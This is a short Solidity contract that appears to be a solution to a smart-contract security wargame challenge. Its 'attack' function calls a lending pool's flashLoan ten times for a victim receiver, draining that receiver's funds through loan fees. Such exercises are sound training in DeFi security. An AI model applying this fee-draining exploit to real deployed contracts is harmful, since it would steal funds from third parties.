// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../naive-receiver//NaiveReceiverLenderPool.sol";


contract NaiveAttacker {

    NaiveReceiverLenderPool public pool;

    constructor(address payable _pool) {
        pool = NaiveReceiverLenderPool(_pool);
    }

    function attack(address _receiver) public {
        for(uint i = 0; i < 10; i++) {
            pool.flashLoan(_receiver, 1);
        }
    }

}
